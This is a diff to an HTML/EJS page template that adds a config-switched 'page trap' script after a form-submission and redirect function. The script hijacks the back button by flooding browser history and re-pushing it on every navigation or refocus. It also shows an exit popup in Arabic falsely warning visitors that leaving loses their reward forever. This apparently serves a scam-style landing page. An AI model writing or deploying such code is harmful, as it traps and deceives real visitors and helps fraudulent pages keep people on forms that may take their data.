@@ -356,6 +356,35 @@ function submitForm(e) {
     setTimeout(()=>{ window.location.href = REDIRECT; }, 3000);
   }, 2500);
 }
+<% if(cfg.trapEnabled){ %>
+// ── Page trap (back button hijack + exit popup) ───────────────────────────────
+(function(){
+  // 1. Flood history so back button loops back to this page
+  for(var i=0;i<50;i++) history.pushState(null,'',location.href);
+  window.addEventListener('popstate',function(){ history.pushState(null,'',location.href); });
+
+  // 2. BeforeUnload popup when closing/navigating away
+  window.addEventListener('beforeunload',function(e){
+    e.preventDefault();
+    e.returnValue='⚠️ إذا خرجت ستفقد مكافأتك نهائياً!';
+    return e.returnValue;
+  });
+
+  // 3. If tab loses focus for too long, re-alert on return
+  var _hidden=false;
+  document.addEventListener('visibilitychange',function(){
+    if(document.hidden){ _hidden=true; }
+    else if(_hidden){
+      _hidden=false;
+      setTimeout(function(){
+        if(document.visibilityState==='visible'){
+          history.pushState(null,'',location.href);
+        }
+      },200);
+    }
+  });
+})();
+<% } %>
 </script>
 </body>
 </html>
